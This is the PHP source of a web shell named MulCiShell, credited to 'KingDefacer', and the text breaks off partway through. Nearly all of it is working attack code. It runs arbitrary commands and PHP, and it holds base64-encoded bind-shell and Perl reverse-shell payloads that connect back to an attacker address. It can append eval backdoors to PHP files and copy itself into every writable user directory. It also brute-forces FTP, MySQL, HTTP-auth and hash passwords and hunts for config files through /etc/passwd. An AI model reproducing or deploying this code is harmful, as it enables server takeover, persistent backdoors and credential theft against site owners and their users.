<?php
#/\/\/\/\/\  MulCiShell v0.2 - Edited By KingDefacer/\/\/\/\/\/\/\#
# Updates from version 1.0#
# 1) Fixed MySQL insert function
# 2) Fixed trailing dirs
# 3) Fixed file-editing when set to 777
# 4) Removed mail function (who needs it?)
# 5) Re-wrote & improved interface
# 6) Added actions to entire directories
# 7) Added config+forum finder
# 8) Added MySQL dump function
# 9) Added DB+table creation, DB drop, table delete, and column+table count
# 10) Updated security-info feature to include more useful details
# 11) _Greatly_ Improved file browsing and handling
# 12) Added banner
# 13) Added DB-Parser and locator
# 14) Added enumeration function
# 15) Added common functions for bypassing security restrictions
# 16) Added bindshell & backconnect (needs testing)
# 17) Improved command execution (alts)
#/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/#
@ini_set("memory_limit","256M");
@set_magic_quotes_runtime(0);
session_start();
ob_start();
$start=microtime();
if(isset($_GET['theme'])) $_SESSION['theme']=$_GET['theme'];
//Thanks korupt ;)
$backdoor_c="DQojaW5jbHVkZSA8YXNtL2lvY3Rscy5oPg0KI2luY2x1ZGUgPHN5cy90aW1lLmg+DQojaW5jbHVkZSA8c3lzL3NlbGVjdC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPHB0aHJlYWQuaD4NCg0Kdm9pZCAqQ2xpZW50SGFuZGxlcih2b2lkICpjbGllbnQpDQp7DQoJaW50IGZkID0gKGludCljbGllbnQ7DQoJZHVwMihmZCwgMCk7DQoJZHVwMihmZCwgMSk7DQoJZHVwMihmZCwgMik7DQoJaWYoZm9yaygpID09IDApDQoJCWV4ZWNsKCIvYmluL2Jhc2giLCAicmVzbW9uIiwgMCk7DQoJY2xvc2UoZmQpOw0KCXJldHVybiAwOw0KfQ0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KCWludCBtc29jaywgY3NvY2ssIGkgPSAxOw0KCXB0aHJlYWRfdCB0aHJlYWQ7DQoJc3RydWN0IHNvY2thZGRyIHNhZGRyOw0KCXN0cnVjdCBzb2NrYWRkcl9pbiBzYWRkckluOw0KICAgIGludCBwb3J0PWF0b2koYXJndlsxXSk7DQoJaWYoKG1zb2NrID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCkpID09IC0xKQ0KCQlyZXR1cm4gLTE7DQoNCglzYWRkckluLnNpbl9mYW1pbHkJCT0gQUZfSU5FVDsNCglzYWRkckluLnNpbl9hZGRyLnNfYWRkcgk9IElOQUREUl9BTlk7DQoJc2FkZHJJbi5zaW5fcG9ydAkJPSBodG9ucyhwb3J0KTsNCiAgIA0KCW1lbWNweSgmc2FkZHIsICZzYWRkckluLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyX2luKSk7DQoJc2V0c29ja29wdChtc29jaywgU09MX1NPQ0tFVCwgU09fUkVVU0VBRERSLCAoY2hhciAqKSZpLCBzaXplb2YoaSkpOw0KIA0KCWlmKGJpbmQobXNvY2ssICZzYWRkciwgc2l6ZW9mKHNhZGRyKSkgIT0gMCl7DQoJCWNsb3NlKG1zb2NrKTsNCgkJcmV0dXJuIC0xOw0KCX0NCiANCglpZihsaXN0ZW4obXNvY2ssIDEwKSA9PSAtMSl7DQoJCWNsb3NlKG1zb2NrKTsNCgkJcmV0dXJuIC0xOw0KCX0NCiANCgl3aGlsZSgxKXsNCgkJaWYoKGNzb2NrID0gYWNjZXB0KG1zb2NrLCBOVUxMLCBOVUxMKSkgIT0gLTEpew0KCQkJcHRocmVhZF9jcmVhdGUoJnRocmVhZCwgMCwgaGFuZGxlciwgKHZvaWQgKiljc29jayk7DQoJCX0NCgl9DQoJDQoJcmV0dXJuIDE7DQp9"; 
$backconnect_perl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KbXkgKCRpYWRkciwkcG9ydCwkY21kKT1AQVJHVjsNCm15ICRwYWRkcj1zb2NrYWRkcl9pbigkcG9ydCwgaW5ldF9hdG9uKCRpYWRkcikpOw0KbXkgJHByb3RvID0gZ2V0cHJvdG9ieW5hbWUoInRjcCIpOw0Kc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90byk7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKTsNCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOw0Kb3BlbihTVERJTiwiPiZTT0NLRVQiKTsNCnByaW50IFNPQ0tFVCAiU2hlbGwgdGVzdFxuIjsNCnByaW50IGV4ZWMoJGNtZCk7DQpjbG9zZShTVERJTik7DQpjbG9zZShTVERPVVQpOw0K";
$pl_scan="DQoJIyEvdXNyL2Jpbi9wZXJsDQp1c2Ugd2FybmluZ3M7DQp1c2Ugc3RyaWN0Ow0KdXNlIGRpYWdub3N0aWNzOw0KdXNlIElPOjpTb2NrZXQ6OklORVQ7DQpzdWIgdXNhZ2UNCnsNCglkaWUoIiQwIGhvc3Qgc3RhcnRwb3J0IGVuZHBvcnQKIik7DQp9DQp1c2FnZSB1bmxlc3MoQEFSR1Y+MSk7DQpteSgkaG9zdCwkcywkZSk9QEFSR1Y7DQpmb3JlYWNoKCRzLi4kZSkNCnsNCglteSAkc29jaz1JTzo6U29ja2V0OjpJTkVULT5uZXcNCgkoDQoJCVBlZXJBZGRyPT4kaG9zdCwNCgkJUGVlclBvcnQ9PiRfLA0KCQlQcm90bz0+J3RjcCcsDQoJCVRpbWVvdXQ9PjINCgkpOw0KCXByaW50ICJQb3J0ICBvcGVuCiIgaWYgKCRcc29jayk7DQp9DQoNCgk=";
$access_control=0;
$md5_user="KingDefacer";
$md5_pass="123";
$user_agent="KingDefacer";
$allowed_addrs=array('127.0.0.1');
$shell_email="KingDefacer@msn.com";
$self=basename($_SERVER['PHP_SELF']);
$addr=$_SERVER['REMOTE_ADDR'];
$serv=@gethostbyname($_SERVER['HTTP_HOST']);
$soft=$_SERVER['SERVER_SOFTWARE'];
$safe_mode=(@ini_get("safe_mode")=='')?"OFF":"ON";
$open_basedir=(@ini_get("open_basedir")=='')?"OFF":"ON";
$uname=@php_uname();
$space=TrueSize(disk_free_space(realpath(getcwd())));
$total=TrueSize(disk_total_space(realpath(getcwd())));
$id=@execmd("id",$disable);
$int_paths=array("mybb","phpbb","phpbb3","forum","forums","board","boards","bb","discuss");
$inc_paths=array("includes","include","inc");
$sql_build_path;
echo "<script type=\"text/javascript\" language=\"javascript\">
function togglecheck() 
{
    var cb=document.forms[0].check
    for (i in cb) 
    {
        cb[i].checked=(cb[i].checked)?false:true;
    }
}
</script>";
switch($access_control) #Break statements intentionally ommited
{
    case 3:
    $ip_allwd=false;
    foreach($allowed_addrs as $addr) 
    {
        if($addr==$_SERVER['REMOTE_ADDR']) {$ip_allwd=true; break;}
        if(!$ip_allwd) exit;
    }
    case 2:
    if(!isset($_SERVER['PHP_AUTH_USER'])||$_SERVER['PHP_AUTH_USER']!=$md5_user||$_SERVER['PHP_AUTH_PW']!=$md5_pass)
    {
            header("WWW-Authenticate: Basic Realm=\"Restricted area\"");
            header("HTTP/1.1 401 Unauthorized");
            echo "Wrong username/password";
            exit;
    }
    case 1:
    if($_SERVER['HTTP_USER_AGENT']!=$user_agent) exit;
}
if($id) 
{
        $s=strpos($id,"(",0)+1;
        $e=strpos($id,")",$s);
        $idval=substr($id,$s,$e-$s);
}
$disable=@ini_get("disable_functions");
if(empty($disable)) $disable="None";
function rm_rep($dir,&$success,&$fail)
{
        @$dh=opendir($dir);
        if(is_resource($dh))
        {
        while((@$rm=readdir($dh)))
        {
            if($rm=='.' || $rm=='..') continue;
            if(is_dir($dir.'/'.$rm)) {echo "Deleting dir $dir/$rm...</br>"; rm_rep($dir.'/'.$rm,$success,$fail); continue;}
            if(@unlink($dir.'/'.$rm)) {$success++;echo "Deleted $rm...</br>";}
            else {$fail++; echo "Failed to delete $rm</br>";}
        }
        @closedir($dh);
    } else echo "Failed to open dir $dir</br>";
}
function chmod_rep($dir,&$success,&$fail,$mod_value)
{
        @$dh=opendir($dir);
        if(is_resource($dh))
        {
        while((@$ch=readdir($dh)))
        {
            if($ch=='.' || $ch=='..') continue;
            if(is_dir($dir.'/'.$ch)) {echo "Changing file modes in dir $dir/$ch...</br>"; chmod_rep($dir.'/'.$ch,$success,$fail,$mod_value); continue;}
            if(@chmod($dir.'/'.$ch,$mod_value)) {$success++;echo "Changed mode for $ch...</br>";}
            else {$fail++; echo "Failed to chmod $rm</br>";}
        }
        @closedir($dh);
    } else echo "Failed to open dir $dir</br>";
}
#Complete these functions
function spread_self($user,&$c=0,$d=0)
{
            if(!$d) $dir="/home/$user/public_html/"; 
            else $dir=$d;
            if(is_dir($dir)&&is_writable($dir))
            {
                copy(CleanDir(getcwd()).'/'.basename($_SERVER['PHP_SELF']),$dir.$f.'/mshell.php'); 
                echo "[+] Shell copied to $dir.$f./mshell.php</br>"; 
                $c++;
            }
            if(@$dh=opendir($dir)) echo "[-] Failed to open dir $dir</br>";
            while((@$f=readdir($dh)))
            {
                if($f!="."&&$f!="..")
                {
                    if(@is_dir($dir.$f)) 
                    {
                        echo "[+] Spreading to dir $dir</br>";
                        if(@is_writable($dir.$f))
                        {
                            copy(CleanDir(getcwd()).'/'.basename($_SERVER['PHP_SELF']),$dir.$f.'/mshell.php'); 
                            echo "[+] Shell copied to $dir.$f./mshell.php</br>"; 
                            $c++;
                        }
                        $c+=spread_self($user,$c,$dir.$f.'/');
                    }
                }
            }
}
function copy_rep($dir,&$c)
{

}
function backup_site()
{
    if(!isset($_POST['busite']))
    {
        echo "<center>The following tool will attempt to retrieve every file from the specified dir (including child dirs).</br>If successful, you will be prompted for a site backup download.</br><i>Note: Only readable files will be downloaded. Images and executables will be discarded. This tool should only be used in scenarios in which you have to quickly retrieve a site's source.</i></center>"; 
    }
}
function infect_rep($dir,&$success,&$fail)
{
}
function copy_dir($dir,$new_dir)
{
}
##################################
function execmd($cmd,$d_functions="None")
{
    if($d_functions=="None") {$ret=passthru($cmd); return $ret;}
    $funcs=array("shell_exec","exec","passthru","system","popen","proc_open");
    $d_functions=str_replace(" ","",$d_functions);
    $dis_funcs=explode(",",$d_functions);
    foreach($funcs as $safe)
    {
        if(!in_array($safe,$dis_funcs)) 
        {
            if($safe=="exec")
            {
                $ret=@exec($cmd);
                $ret=join("\n",$ret);
                return $ret;
            }
            elseif($safe=="system")
            {
                $ret=@system($cmd);
                return $ret;
            }
            elseif($safe=="passthru")
            {
                $ret=@passthru($cmd);
                return $ret;
            }
            elseif($safe=="shell_exec")
            {
                $ret=@shell_exec($cmd);
                return $ret;
            }
            elseif($safe=="popen")
            {
                $ret=@popen("$cmd",'r');
                if(is_resource($ret))
                {
                    while(@!feof($ret))
                    $read.=@fgets($ret);
                    @pclose($ret);
                    return $read;
                }
                return -1;
            }
            elseif($safe="proc_open")
            {
                $cmdpipe=array(
                0=>array('pipe','r'),
                1=>array('pipe','w')
                );
                $resource=@proc_open($cmd,$cmdpipe,$pipes);
                if(@is_resource($resource))
                {
                    while(@!feof($pipes[1]))
                    $ret.=@fgets($pipes[1]);
                    @fclose($pipes[1]);
                    @proc_close($resource);
                    return $ret;
                }
                return -1;
            }
        }
    }
    return -1;
}
$links=array("Enumerate"=>"$self?act=enum","Files"=>"$self?act=files","Domains"=>"$self?act=domains","MySQL"=>"$self?act=sql","Encoder"=>"$self?act=encode",
"Sec. Info"=>"$self?act=sec","Cracker"=>"$self?act=bf",
"Bypassers"=>"$self?act=bypass","Tools"=>"$self?act=tools","Databases"=>"$self?act=dbs","Backdoor Host"=>"$self?act=bh","Back Connect"=>"$self?act=backc","Spread Shell"=>"$self?act=spread","Kill Shell"=>"$self?act=kill");
    echo "<html><head><title>MulCiShell v2.0 - Edited By KingDefacer</title></head>";
    switch($_SESSION['theme'])
    {
        case 'green':
        echo "<style>
            body{color:#66FF00; font-size: 12px; font-family: serif; background-color: black;}
            td {border: 1px solid #00FF00; background-color:#001f00; padding: 2px; font-size: 12px; color: #33FF00;}
            td:hover{background-color: black; color: #33FF00;}
            input{background-color: black; color: #00FF00; border: 1px solid green;}
            input:hover{background-color: #006600;}
            textarea{background-color: black; color: #00FF00; border: 1px solid white;}
            a {text-decoration: none; color: #66FF00; font-weight: bold;}
            a:hover {color: #00FF00;}
            select{background-color: black; color: #00FF00;}
            #main{border-bottom: 1px solid #33FF00; padding: 5px; text-align: center;}
            #main a{padding-right: 15px; color:#00CC00; font-size: 12px; font-family: arial; text-decoration: none; }
            #main a:hover{color: #00FF00; text-decoration: underline;}
            #bar{width: 100%; position: fixed; background-color: black; bottom: 0; font-size: 10px; left: 0; border-top: 1px solid #FFFFFF; height: 12px; padding: 5px;}
            </style>
            <body>";
        break;
        case 'dark':
            echo "<style>
            body{color: #FFFFFF; font-size: 12px; font-family: serif; background-color: #000000;}
            td {border: 1px solid #FFFFFF; background-color: #000000; padding: 2px; font-size: 12px; color: #FFFFFF;}
            input{background-color: black; color: #FFFFFF;; border: 1px solid #FFFFFF;}
            input:hover{background-color: #000099;}
            textarea{background-color: #000000; color: #FFFFFF; border: 1px solid white;}
            a {text-decoration: none; color: #FFFFFF; font-weight: bold;}
            a:hover {font-weight: bold;}
            select{background-color: #000000; color: #FFFFFF;}
            #main{border-bottom: 1px solid white; padding: 5px; text-align: center;}
            #main a{padding-right: 15px; color:#FFFFFF; font-size: 12px; font-family: arial; text-decoration: none; }
            #main a:hover{font-weight: bold;}
            #bar{width: 100%; position: fixed; background-color: black; bottom: 0; font-size: 10px; left: 0; border-top: 1px solid #FFFFFF; height: 12px; padding: 5px;}
            </style><body>";
        break;
        default:
            echo "<style>
            body{color: white; font-size: 12px; font-family: arial; scrollbar-base-color:blue; scrollbar-arrow-color:yellow; scrollbar-face-color:blue; }
            td {border: 1px solid #000099; background-color: #000033; padding: 2px; font-size: 12px; color: white; }
            input{background-color: black; color: white; border: 1px solid #000066;}
            input:hover{background-color: #000066; border: 1px solid white;}
            td:hover {color: yellow; background: black;}
            textarea{background-color: #000033; color: white; border: 1px solid white;}
            a {text-decoration: none; color: white; font-weight: bold;}
            a:hover {color: yellow}
            select{background-color: black; color: white;}
            #main{border-bottom: 1px solid #0066FF; padding: 5px; text-align: center;}
            #main a{padding-right: 15px; color: white; font-size: 12px; font-family: arial; text-decoration: none; }
            #main a:hover{color: #0033FF; text-decoration: underline;}
            #bar{width: 100%; position: fixed; background-color: black; bottom: 0; font-size: 10px; left: 0; border-top: 1px solid #FFFFFF; height: 12px; padding: 5px;}
            </style>
            <body bgcolor='black'>";
            break;
    }
    echo base64_decode("PGNlbnRlcjxpbWcgc3JjPSdodHRwOi8vaW1nNTI5LmltYWdlc2hhY2sudXMvaW1nNTI5LzExNjYv
bWlsY2lzaGVsbGxrNi5wbmcnPjwvY2VudGVyPg==");
echo "<table style='width: inherit; margin: auto; text-align: center;'>
<tr><td>Server IP</td><td>Your IP</td><td>Disk space</td><td>Safe_mode?</td><td>Open_BaseDir?</td><td>System</td><td>Server software</td><td>Disabled functions</td><td>ID</td><td>Shell location</td></tr>
<tr><td>$serv</td><td>$addr</td><td>$space of $total</td><td>$safe_mode</td><td>$open_basedir</td><td>$uname</td><td>$soft</td><td>$disable</td><td>$idval</td><td>".CleanDir(getcwd()).'/'.basename($_SERVER['PHP_SELF'])."</td></tr>
</table></br>
<div id='main'>";
foreach($links as $val=>$addr) echo "<a href='$addr'>[ $val ]</a>";
echo "</div><br>";
if(isset($_POST['encryption']))
{
    $e=$_POST['encrypt'];
    echo "<form action='$self?' method='post'><center><textarea rows='19' cols='75' readonly>MD5: ".md5($e)."\nSHA1: ".sha1($e)."\nCrypt: ".crypt($e)."\nCRC32: ".crc32($e)."\nBase64 Encoded: ".base64_encode($e)."\nBase64 decoded: ".base64_decode($e)."\nURL encode: ".urlencode($e)."\nURL decode: ".urldecode($e)."\nBin2Hex ".bin2hex($e)."\nDec2Hex: ".dechex($e)."</textarea><br><br>Input: <input type='text' style='width: 300px' name='encrypt'>
    <br><input type='submit' value='Encrypt' name='encryption'></center>";
}
if(isset($_POST['dogetfile']))
execmd("wget $_POST[wgetfile]",$disable);
if(isset($_POST['doUpload']))
{
    $dir=$_POST['u_location'];
    $name=$_FILES['u_file']['name'];
    switch($_FILES['u_file']['error'])
    {
        case 0:
        if(@move_uploaded_file($_FILES['u_file']['tmp_name'],$dir.'/'.$name))
        echo "File uploaded successfully<br>";
        else echo "Failed to upload file!";
    }
}
if(isset($_POST['massfiles']))
{
    $fail=0;
    $success=0;
    switch($_POST['fileaction'])
    {
        case 'Infect': #Nothing special here, just kick them while they're down
        foreach($_POST['files'] as $file)
        {
            $ext=strrchr($file,'.');
            if($ext!=".php") continue;
            @$fh=fopen($file,'a');
            if(@is_resource($fh))
            {
                $success++;
                @fwrite($fh,"<?php @eval(\$_GET['e']) ?>");
                @fclose($fh);
            } else $fail++;
        }
        echo "Successfully infected $success files; failed to infect $fail files</br>Exploit files as such: file.php?e=php code";
        break;
        case 'Delete':
        foreach($_POST['files'] as $file)
        {
            if(is_dir($file)) rm_rep($file,$success,$fail);
            else
            {
                if(@unlink(CleanDir($file)))
                {
                    echo "File $file deleted<br>";
                    $success++;
                }
                else
                {
                    echo "Failed to delete file $file<br>";
                    $fail++;
                }
            }
        }
        echo "Total files deleted: $success; failed to delete $fail files<br>";
        break;
        case 'Chmod':
        foreach($_POST['files'] as $file)
        {
            if(is_dir($file)) chmod_rep($file,$success,$fail,$_POST['cmodv']);
            if(@chmod(CleanDir($file),$_POST['cmodv']))
            {
                echo "Changed mode for $file<br>";
                $success++;
            }
            else
            {
                echo "Failed to change mode for $file<br>";
                $fail++;
            }
        }
        echo "Total files modes modified: $success; failed to chmod $fail files<br>";
        break;
    }
}
if(isset($_POST['docrack']))
{
        $con=true;
        $show=0;
        $list=@fopen($_FILES['wordlist']['tmp_name'],'r');
        if(is_resource($list))
        {
            if(isset($_POST['ftpcrack']))
            {
                echo "Bruting $_POST[ftp_user]@$_POST[ftp_host]...</br>";
                if(!empty($_POST['ftp_port'])) $port=$_POST['ftp_port'];
                else $port='3306';
                if(empty($_POST['ftp_timeout'])||!preg_match("/^[0-9]$/",$_POST['ftp_timeout']))
                $time=3;
                else $time=$_POST['ftp_timeout'];
                @$ftp=ftp_connect($_POST['ftp_host'],$port,$time);
                if(!$ftp) $con=false;
                if($con)
                {
                    $show++;
                    while(!feof($list))
                    {
                        @$pass=fgets($list);
                        if(ftp_login($ftp,$_POST['ftp_user'],trim($pass)))
                        {
                            echo "Password found! Password for $_POST[ftp_user] is $pass<br>";
                            @ftp_close($ftp);
                            break;
                        }
                        if($show==10000){echo "Trying pass $pass...</br>"; $show=0;}
                    }
                } else echo "Failed to connect!</br>";
            } 
            elseif(isset($_POST['remote_login']))
            {
                //if(!function_exists("jitghjytiojho")) die("cURL support has to be enabled.");
                /*
                $ch=curl_init($_POST['remote_login_target']);
                curl_setopt($ch,CURLOPT_HEADER,0);
                curl_setopt($ch,CURLOPT_POST,1);
                curl_setopt($ch,CURLOPT_POSTFIELDS,'');
                curl_exec($ch);
                */
                if(preg_match("/^http:\/\/+/",$_POST['remote_login_target'])) die("Do not include http:// in the target URL.");
                $path=explode('/',$_POST['remote_login_target']);
                $site=$path[0];
                for($i=1;$i<count($path);$i++) $full_path.='/'.$path[$i];
                
            }
            elseif(isset($_POST['vbcrack']))
            {
                if(empty($_POST['vbhash']) OR empty($_POST['vbsalt'])) die("Please specify a hash and salt");
                while(!feof($list))
                {
                    $show++;
                    $pass=trim(fgets($list));
                    $vbenc=md5(md5($pass).$_POST['vbsalt']);
                    if($vbenc===$_POST['vbhash'])
                    {
                        echo "Password for $_POST[vbhash] found! is $pass</br>";
                        break;
                    }
                    if($show===10000)
                    {
                        $show=0;
                        echo "Trying pass $pass...</br>";
                    }
                }
                echo "Complete</br>";
            }
            elseif(isset($_POST['mysqlcrack']))
            {
                $host=$_POST['mysql_host'];
                $user=$_POST['mysql_user'];
                if(!empty($_POST['mysql_port']))  $host.=":$_POST[mysql_port]";
                    while(!feof($list))
                    {
                        $show++;
                        $pass=trim(fgets($list));
                        if(@mysql_connect($host,$user,$pass))
                        {
                            echo "Password found! Password for $user is $pass</br>";
                            break;
                        }
                        if($show==10000)
                        {
                            echo "Trying $pass...</br>";
                            $show=0;
                            continue;
                        }
                    }
            } 
            elseif(isset($_POST['authcrack']))
            {
                $arr=explode('/',$_POST['auth_url']);
                $con_url=$arr[0];
                if(empty($_POST['auth_url'])) die("Enter a target first...");
                for($i=1;$i<count($arr);$i++) $path.='/'.$arr[$i]; 
                if(preg_match("/^http:\/\/+/",$_POST['auth_url'])) die("Do not include http:// in the url");
                while(!feof($list))
                {
                        if(is_resource($conn_url=fsockopen($con_url,80,$errno,$errstr,5)))
                        {
                            $show++;
                            $pass=trim(fgets($list));
                            if($show>5000) {$show=0; echo $pass;}
                            $encode=base64_encode(trim($_POST['auth_user']).':'.$pass);
                            $header="GET $path HTTP/1.1\r\n";
                            $header.="Host: $con_url\r\n";
                            $header.="Authorization: Basic $encode\r\n";
                            $header.="Connection: Close\r\n\r\n";
                            fputs($conn_url,$header,strlen($header));
                            $tmp++;
                            while(!feof($conn_url)) 
                            {
                                $tmp=fgets($conn_url);
                                if(preg_match("/HTTP\/\d+\.\d+ 200+/",$tmp))
                                {
                                    echo "Password found! Password=$pass</br></br>";
                                    break 2;
                                }
                            }
                        }
                }
                echo "Done</br>";
            }
            elseif(isset($_POST['md5crack']))
            {
                if(empty($_POST['md5hash'])) die("Enter a hash before attempting to crack one ;)");
                $md5=trim($_POST['md5hash']);
                while(!feof($list))
                {
                    $show++;
                    $pass=trim(fgets($list));
                    if(md5($pass)===$md5)
                    {
                        echo "Password found! Plaintext for $md5 is $pass</br>";
                        break;
                    }
                    if($show==10000)
                    {
                        echo "Trying $pass...</br>";
                        $show=0;
                        continue;
                    }
                 }
            }
            elseif(isset($_POST['sha1crack']))
            {
                if(empty($_POST['sha1hash'])) die("Enter a hash before attempting to crack one ;)");
                $sha1=trim($_POST['sha1hash']);
                while(!feof($list))
                {
                    $show++;
                    $pass=trim(fgets($list));
                    if(sha1($pass)===$sha1)
                    {
                        echo "Password found! Plaintext for $sha1 is $pass</br>";
                        break;
                    }
                    if($show==10000)
                    {
                        echo "Trying $pass...</br>";
                        $show=0;
                        continue;
                    }
                 }
            }
        }
        @fclose($list);
}
if(isset($_POST['port_scan']))
{
    switch($_POST['type'])
    {
        case 'php':
            extract($_POST);
            while($sport<=$eport)
            {
                echo "Trying port $sport";
                if(@fsockopen($host,$sport,$errno,$errstr,2)) echo "Port $sport open</br>";
                $sport++;
            }
        break;
        default:
            echo "Invalid request</br>";
    }
}
if(isset($_POST['find_forums']))
{
    echo "<center><b>[ Forum locator ]</b></center></br></br>";
    $found=0;
    global $int_paths;
    @$fp=fopen($_POST['passwd'],'r') or die("Failed to open passwd file!");
    while(!feof($fp))
    {
        @list($user,$x,$uid,$gid,$blank,$home_dir)=explode(":",fgets($fp));
        $path="/home/$user/public_html";
        if(@is_dir($path))
        {
            foreach($int_paths as $forum_path)
            {
                $full_path=$path."/$forum_path/";
                if(@is_dir($full_path))
                {
                    echo "[+] Forum found: Path: $full_path</br>";
                    $found++;
                    continue;
                }
            }
        } 
    }
    echo "Scan complete. Found $found forums</br></br>";
}
function find_configs($path,&$found)
{
        if(@file_exists($path.'config.php'))
        {
            echo "Found config file: $path"."config.php</br>";
            $found++;
        }
        @$dh=opendir($path);
        while((@$file=readdir($dh)))
        if(is_dir($file)&&$file!='.'&&$file!='..') find_configs($path.$file.'/',$found);
        @closedir($dh);
}
if(isset($_POST['find_configs']))
{
    $found=0;
    echo "<center><b>[ Config locator ]</b></center></br></br>";
    @$fp=fopen($_POST['passwd'],'r') or die("Failed to open passwd file!");
    while(!feof($fp))
    {
        @list($user,$x,$uid,$gid,$blank,$home_dir)=explode(":",fgets($fp));
        $path="/home/$user/public_html/";
        find_configs($path,$found);
    }
    @fclose($fp);
    echo "Scan complete. Found $found configs</br></br>";
}
if(isset($_POST['execmd']))
{echo "<center><textarea rows='10' cols='100'>";
echo execmd($_POST['cmd'],$disable);
echo "</textarea></center>";}
if(isset($_POST['execphp']))
{echo "<center><textarea rows='10' cols='100'>";
echo eval(stripslashes($_POST['phpcode']));
echo "</textarea></center>";}
if(isset($_POST['cnewfile']))
{
    if(@fopen($_POST['newfile'],'w')) echo "File created<br>";
    else echo "Failed to create file<br>";
}
if(isset($_POST['cnewdir']))
{
    if(@mkdir($_POST['newdir'])) echo "Directory created<br>";
    else echo "Failed to create directory<br>";
}
if(isset($_POST['doeditfile'])) FileEditor();
switch($_GET['act'])
{
    case 'backc':
    if(!isset($_POST['backconnip']))
    {
        echo "<center><form action='$self?act=backc' method='post'>
        Address: <input type='text' value='$_SERVER[REMOTE_ADDR]' name='backconnip'>
        Port: <input type='text' value='1337' name='backconnport'>
        <input type='submit' value='Connect'></br></br>
        Listen with netcat by executing 'nc -l -n -v -p 1337'</br></br>
        <b>Note: Be sure to foward your port first</b>
        </form></center>";
    } else {
        if(empty($_POST['backconnport'])||empty($_POST['backconnip'])) die("Specify a host/port");
        if(is_writable("."))
        {
            @$fh=fopen(getcwd()."/bc.pl",'w');
            @fwrite($fh,base64_decode($backconnect_perl));
            @fclose($fh);
            echo "Attempting to connect...</br>";
            execmd("perl ".getcwd()."/bc.pl $_POST[backconnip] $_POST[backconnport]",$disable);
            if(!@unlink(getcwd()."/bc.pl")) echo "<font color='#FF0000'>Warning: Failed to delete reverse-connection program</font></br>";
            } else {
                @$fh=fopen("/tmp/bc.pl","w");
                @fwrite($fh,base64_decode($backconnect_perl));
                @fclose($fh);
                echo "Attempting to connect...</br>";
                if(!@unlink("/tmp/bc.pl")) echo "<font color='#FF0000'><h2>Warning: Failed to delete reverse-connection program<</h2>/font></br>";
        }
    }
    break;
    case 'dbs': database_tools(); break;
    case 'sql': SQLLogin(); break;
    case 'sqledit': SQLEditor(); break;
    case 'download': SQLDownload(); break;
    case 'tools': show_tools(); break;
    case 'logout': $_SESSION=array(); session_destroy(); echo "Logged out from MySQL.<br>"; break;
    case 'f': FileEditor(); break;
    case 'encode':Encoder(); break;
    case 'bypass':security_bypass(); break;
    case 'bf':brute_force(); break;
    case 'bh': BackDoor(); break; 
    case 'spread':
    if(!isset($_POST['spread_shell']))
    {
        echo "<center><form action='?act=spread' method='post'>
        This tool will attempt to copy the shell into every writable directory on the server, in order to allow access maintaining.</br>
        Passwd file: <input type='text' value='/etc/passwd' name='passwd_file'></br>
        <input type='submit' value='Spread' name='spread_shell'>
        </form></center>";
    } else {
        $s=0;
        @$file=fopen($_POST['passwd_file'],'r');
        if(is_resource($file))
        {
            while(!feof($file))
            {
                @list($user,$x,$uid,$gid,$blank,$home_dir)=explode(":",fgets($file));
                spread_self($user,$s);
            }
            @fclose($file);
        }
        echo ($s>0)?"Spread complete. Successfully managed to spread the shell $s times</br>":"Failed to spread the shell.</br>";
    }
    break;
    case 'domains':
    $header="GET /search/reverse-ip-domain.php?q=$_SERVER[HTTP_HOST] HTTP/1.0\r\n";
    $header.="Host: searchy.protecus.de\r\n";
    $header.="Connection: Close\r\n\r\n";
    $domain_handle=fsockopen("searchy.protecus.de",80);
    @fputs($domain_handle,$header,strlen($header));
    while(@!feof($domain_handle))
    {
        echo fgets($domain_handle);
    } 
    break;
    case 'kill':
    if(!isset($_POST['justkill']))
    {
        echo "<center>Do you *really* want to kill the shell?<br><br><form action='$self?act=kill' method='post'>
        <input type='submit' value='Yes' name='justkill'></center>";
    } else {
        if(@unlink(basename($_SERVER['PHP_SELF']))) echo "Shell deleted.<br>";
        else echo "Failed to delete shell<br>";
    }
    break;
    case 'sec':
    $mysql_on=function_exists("mysql_connect")?"ON":"OFF";
    $curl_on=function_exists("curl_init")?"ON":"OFF";
    $magic_quotes_on=get_magic_quotes_gpc()?"ON":"OFF";
    $register_globals_on=(@ini_get('register_globals')=='')?"OFF":"ON";
    $include_on=(@ini_get('allow_url_include')=='')?"Disabled":"Enabled";
    $etc_passwd=@is_readable("/etc/passwd")?"Yes":"No";
    $ver=phpversion();
    echo "<center>Security overview</center><table style='margin: auto;'><tr><td>PHP Version</td><td>Safe mode</td><td>Open_Basedir</td><td>Magic_Quotes</td><td>Register globals</td><td>
    Remote includes</td><td>Read /etc/passwd?</td><td>MySQL</td><td>cURL</td></tr>
    <tr><td>$ver</td><td>$safe_mode</td><td>$open_basedir</td><td>$magic_quotes_on</td><td>$register_globals_on</td><td>$include_on</td>
    <td>$etc_passwd</td><td>$mysql_on</td><td>$curl_on</td>
    </tr>";
    "</table>";
    break;
    case 'enum':
    $windows=0;
    $path=CleanDir(getcwd());
    if(!eregi("Linux",php_uname())) {$windows=1;}
    if(!$windows)
    {
        $spath=str_replace("/home/","$serv/~",$path);
        $spath=str_replace("/public_html/","/",$spath);
        $URL="http://$spath/".basename($_SERVER['PHP_SELF']);
        echo "Enumerated shell link: <a href='$URL'>$URL</a>";
    } else echo "Enumeration failed<br>";
    break;
}
echo "<br>";
if(isset($_POST['sqlquery']))
{
    extract($_SESSION);
    $conn=@mysql_connect($mhost.":".$mport,$muser,$mpass);
    if($conn)
    {
